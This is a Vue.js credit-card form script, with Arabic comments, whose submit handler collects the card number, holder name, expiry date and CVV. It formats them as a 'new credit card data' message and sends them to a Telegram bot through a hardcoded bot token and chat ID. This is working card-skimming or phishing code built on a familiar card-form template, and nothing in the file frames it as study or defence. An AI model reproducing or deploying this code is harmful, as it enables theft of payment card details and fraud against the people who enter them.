/*
نموذج بطاقة ائتمان Vue.js مع إرسال تلقائي إلى بوت تليجرام
*/

new Vue({
  el: "#app",
  data() {
    return {
      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
      cardName: "",
      cardNumber: "",
      cardMonth: "",
      cardYear: "",
      cardCvv: "",
      minCardYear: new Date().getFullYear(),
      amexCardMask: "#### ###### #####",
      otherCardMask: "#### #### #### ####",
      cardNumberTemp: "",
      isCardFlipped: false,
      focusElementStyle: null,
      isInputFocused: false,
      telegramBotToken: "8642789421:AAH5WVNFF0yxI-OIRjtsMPuBw3cSawVF1pk",
      telegramChatId: "8642789421"
    };
  },
  mounted() {
    this.cardNumberTemp = this.otherCardMask;
    document.getElementById("cardNumber").focus();
  },
  computed: {
    getCardType () {
      let number = this.cardNumber;
      let re = new RegExp("^4");
      if (number.match(re) != null) return "visa";

      re = new RegExp("^(34|37)");
      if (number.match(re) != null) return "amex";

      re = new RegExp("^5[1-5]");
      if (number.match(re) != null) return "mastercard";

      re = new RegExp("^6011");
      if (number.match(re) != null) return "discover";
      
      re = new RegExp('^9792')
      if (number.match(re) != null) return 'troy'

      return "visa"; // default type
    },
		generateCardNumberMask () {
			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
    },
    minCardMonth () {
      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
      return 1;
    }
  },
  watch: {
    cardYear () {
      if (this.cardMonth < this.minCardMonth) {
        this.cardMonth = "";
      }
    }
  },
  methods: {
    flipCard (status) {
      this.isCardFlipped = status;
    },
    focusInput (e) {
      this.isInputFocused = true;
      let targetRef = e.target.dataset.ref;
      let target = this.$refs[targetRef];
      this.focusElementStyle = {
        width: `${target.offsetWidth}px`,
        height: `${target.offsetHeight}px`,
        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
      }
    },
    blurInput() {
      let vm = this;
      setTimeout(() => {
        if (!vm.isInputFocused) {
          vm.focusElementStyle = null;
        }
      }, 300);
      vm.isInputFocused = false;
    },
    submitForm() {
      // التحقق من ملء جميع الحقول
      if (!this.cardNumber || !this.cardName || !this.cardMonth || !this.cardYear || !this.cardCvv) {
        alert("يرجى ملء جميع الحقول");
        return;
      }

      // إنشء رسالة البيانات
      const message = `
📋 بيانات بطاقة ائتمان جديدة:
━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 رقم البطاقة: ${this.cardNumber}
👤 اسم صاحب البطاقة: ${this.cardName}
📅 تاريخ الانتهاء: ${this.cardMonth}/${this.cardYear}
🔐 CVV: ${this.cardCvv}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
      `;

      // إرسال الرسالة إلى تليجرام
      this.sendToTelegram(message);
    },
    sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
      
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.telegramChatId,
          text: message,
          parse_mode: 'HTML'
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert("✅ تم إرسال البيانات بنجاح إلى تليجرام");
          // مسح الحقول بعد الإرسال الناجح
          this.cardName = "";
          this.cardNumber = "";
          this.cardMonth = "";
          this.cardYear = "";
          this.cardCvv = "";
          this.isCardFlipped = false;
          document.getElementById("cardNumber").focus();
        } else {
          alert("❌ حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقاً");
          console.error("خطأ تليجرام:", data);
        }
      })
      .catch(error => {
        alert("❌ خطأ في الاتصال. يرجى التحقق من الاتصال بالإنترنت");
        console.error("خطأ:", error);
      });
    }
  }
});
